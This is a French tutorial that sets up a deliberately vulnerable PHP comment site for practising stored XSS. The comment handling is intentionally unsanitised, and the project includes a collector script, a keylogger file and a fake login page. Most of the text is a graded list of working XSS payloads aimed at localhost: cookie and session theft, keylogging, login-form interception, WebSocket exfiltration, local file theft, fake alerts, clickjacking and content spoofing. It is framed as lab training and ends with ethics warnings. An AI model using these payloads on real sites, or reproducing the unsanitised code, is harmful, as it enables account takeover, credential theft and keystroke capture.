# Démo
- Ceci est exemple complet et détaillé qui montre comment créer un site web vulnérable à des fins éducatives, en utilisant de vrais cookies. 
- Assurez-vous de configurer et d'exécuter ce projet dans un environnement sécurisé, comme une machine virtuelle isolée sous Kali Linux.

### Arborescence du système de fichiers

```
/vulnerable-site
├── index.html
├── comment.php
├── comments.json
├── stealdata.php
├── malicious.js
├── offer.html
└── fake.html
```

### Fichiers

#### `index.html`

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Vulnerable Site</title>
</head>
<body>
    <h1>Comment Section</h1>
    <form method="post" action="comment.php">
        <textarea name="comment" rows="4" cols="50" placeholder="Leave a comment"></textarea><br>
        <input type="submit" value="Post Comment">
    </form>
    <div id="comments">
        <!-- Comments will be loaded here -->
    </div>
    <script>
        // Load comments from the server
        fetch('comments.json')
            .then(response => response.json())
            .then(data => {
                let commentsDiv = document.getElementById('comments');
                data.comments.forEach(comment => {
                    let p = document.createElement('p');
                    p.innerHTML = comment;
                    commentsDiv.appendChild(p);
                });
            });
    </script>
</body>
</html>
```

#### `comment.php`

```php
<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['comment'])) {
    $comment = $_POST['comment'];
    $data = json_decode(file_get_contents('comments.json'), true);
    $data['comments'][] = $comment;
    file_put_contents('comments.json', json_encode($data));
    header('Location: index.html');
} else {
    header('Location: index.html');
}
?>
```

#### `comments.json`

```json
{
    "comments": []
}
```

#### `stealdata.php`

```php
<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['data'])) {
    $stolenData = $_POST['data'];
    file_put_contents('stolen_data.txt', $stolenData . "\n", FILE_APPEND);
}
?>
```

#### `malicious.js`

```javascript
document.onkeypress = function(e) {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://localhost/vulnerable-site/keystroke?key=' + e.key, true);
    xhr.send();
};
```

#### `offer.html`

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Exclusive Offer</title>
</head>
<body>
    <h1>Congratulations!</h1>
    <p>You have won an exclusive offer! Click <a href="http://localhost/vulnerable-site">here</a> to go back.</p>
</body>
</html>
```

#### `fake.html`

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Fake Login</title>
</head>
<body>
    <h1>Login</h1>
    <form action="stealdata.php" method="post">
        <input type="text" name="username" placeholder="Username"><br>
        <input type="password" name="password" placeholder="Password"><br>
        <input type="submit" value="Login">
    </form>
</body>
</html>
```

### Instructions d'installation

1. **Installation du serveur web :**

   Installez un serveur web local comme Apache et PHP. Vous pouvez utiliser XAMPP, WAMP, ou MAMP, ou configurer Apache et PHP directement sur Kali Linux.

2. **Déploiement des fichiers :**

   Placez tous les fichiers dans le répertoire de votre serveur web. Par exemple, sur Kali Linux, placez-les dans le répertoire `/var/www/html/vulnerable-site/` :
   ```
   sudo mkdir /var/www/html/vulnerable-site
   sudo cp -r /path/to/your/files/* /var/www/html/vulnerable-site/
   ```

3. **Initialisation de comments.json :**

   Assurez-vous que `comments.json` contient l'objet JSON vide suivant :
   ```json
   {
       "comments": []
   }
   ```

4. **Droits d'écriture :**

   Assurez-vous que le serveur web a les droits d'écriture sur le fichier `comments.json`.
   ```bash
   sudo chown www-data:www-data /var/www/html/vulnerable-site/comments.json
   sudo chmod 664 /var/www/html/vulnerable-site/comments.json
   ```

### Utilisation

1. **Accéder au site :**

   Ouvrez votre navigateur et accédez à `http://localhost/vulnerable-site/` pour voir la page de commentaires.

2. **Soumettre un commentaire :**

   Soumettez un commentaire via le formulaire pour voir comment les commentaires sont enregistrés et affichés.

3. **Injection de scripts XSS :**

   Pour démontrer une attaque XSS, vous pouvez injecter les scripts suivants dans le champ de commentaire.

### Scripts de démonstration

#### Scripts de base

- **Redirection simple :**
  ```html
  <script>
      window.location.href = "http://localhost/vulnerable-site/offer.html";
  </script>
  ```

- **Affichage d'une alerte :**
  ```html
  <script>
      alert('XSS Test');
  </script>
  ```

- **Affichage du cookie :**
  ```html
  <script>
      alert(document.cookie);
  </script>
  ```

#### Scripts intermédiaires

- **Vol de cookies (simulé) :**
  ```html
  <script>
      var img = new Image();
      img.src = 'http://localhost/vulnerable-site/stealdata.php?cookie=' + document.cookie;
  </script>
  ```

- **Envoi des cookies par POST :**
  ```html
  <script>
      var xhr = new XMLHttpRequest();
      xhr.open('POST', 'http://localhost/vulnerable-site/stealdata.php', true);
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr.send('cookie=' + encodeURIComponent(document.cookie));
  </script>
  ```

- **Création d'un formulaire caché pour vol de données :**
  ```html
  <form id="stealData" action="http://localhost/vulnerable-site/stealdata.php" method="post">
      <input type="hidden" name="data" value="Sensitive Data">
  </form>
  <script>
      document.getElementById('stealData').submit();
  </script>
  ```

#### Scripts avancés

- **Exécution d'un script externe :**
  ```html
  <script src="http://localhost/vulnerable-site/malicious.js"></script>
  ```

- **Keylogger simple :**
  ```html
  <script>
      document.onkeypress = function(e) {
          var xhr = new XMLHttpRequest();
          xhr.open('GET', 'http://localhost/vulnerable-site/keystroke?key=' + e.key, true);
          xhr.send();
      };
  </script>
  ```

- **Interception des formulaires de login :**
  ```html
  <script>
      var form = document.forms[0];
      form.onsubmit = function() {
          var xhr = new XMLHttpRequest();
          xhr.open('POST', 'http://localhost/vulnerable-site/stealdata.php', true);
          xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
          xhr.send('username=' + form.username.value + '&password=' + form.password.value);
      };
  </script>
  ```

- **Vol des informations de la session :**
  ```html
  <script>
      var xhr = new XMLHttpRequest();
      xhr.open('GET', 'http://localhost/vulnerable-site/stealdata.php?session=' + encodeURIComponent(document.cookie), true);
      xhr.send();
  </script>
  ```

- **Affichage d'une fausse page de connexion :**
  ```html
  <script>
      document.body.innerHTML = '<form action="http://localhost/vulnerable-site/fake.html" method="post"><input type="text" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" value="Login"></form>';
  </script>
  ```

- **Injection d'une balise script persistante (persistent XSS) :**
  ```html
  <script>
      document.write('<script src="http://localhost/vulnerable-site/malicious.js"><\/script>');
  </script>
  ```

#### Scripts très avancés

- **Utilisation de WebSockets pour exfiltrer des données :**
  ```html
  <script>
      var ws = new WebSocket('ws://localhost/vulnerable-site/socket');
      ws.onopen = function() {
          ws.send('Exfiltrating data...');
          ws.send(document.cookie);
      };
  </script>
  ```

- **Exploitation de l'API FileReader pour voler des fichiers locaux (avec interaction utilisateur) :**
 

 ```html
  <script>
      var input = document.createElement('input');
      input.type = 'file';
      input.onchange = function(event) {
          var file = event.target.files[0];
          var reader = new FileReader();
          reader.onload = function(e) {
              var xhr = new XMLHttpRequest();
              xhr.open('POST', 'http://localhost/vulnerable-site/upload', true);
              xhr.setRequestHeader('Content-Type', 'application/octet-stream');
              xhr.send(e.target.result);
          };
          reader.readAsBinaryString(file);
      };
      document.body.appendChild(input);
  </script>
  ```

- **Déclenchement de fausses alertes de sécurité :**
  ```html
  <script>
      alert('Your system is infected! Click OK to fix.');
      window.location.href = 'http://localhost/vulnerable-site/fix';
  </script>
  ```

- **Interception des clics utilisateur (clickjacking) :**
  ```html
  <style>
      #clickjacker {
          position: absolute;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          opacity: 0;
      }
  </style>
  <iframe id="clickjacker" src="http://localhost/vulnerable-site"></iframe>
  ```

- **Déclenchement de fausses fenêtres de chat :**
  ```html
  <script>
      document.body.innerHTML = '<div id="chat" style="position:fixed;bottom:0;width:100%;background:#fff;border-top:1px solid #ccc;padding:10px;"><input type="text" id="chatInput" placeholder="Type your message here"><button onclick="sendMessage()">Send</button></div>';
      function sendMessage() {
          var message = document.getElementById('chatInput').value;
          var xhr = new XMLHttpRequest();
          xhr.open('POST', 'http://localhost/vulnerable-site/chat', true);
          xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
          xhr.send('message=' + encodeURIComponent(message));
      }
  </script>
  ```

- **Injection de fausses pages de contenu (content spoofing) :**
  ```html
  <script>
      document.body.innerHTML = '<h1>Exclusive Offer!</h1><p>Click <a href="http://localhost/vulnerable-site/offer.html">here</a> to claim your prize!</p>';
  </script>
  ```

## Remarques importantes

- **N'utilisez ces scripts que dans un environnement contrôlé et à des fins éducatives.**
- **Assurez-vous d'obtenir les permissions nécessaires pour effectuer ces tests sur les systèmes concernés.**

La sécurité informatique est une responsabilité partagée, et l'apprentissage des vulnérabilités doit toujours s'accompagner d'un fort sens de l'éthique et du respect des lois en vigueur.
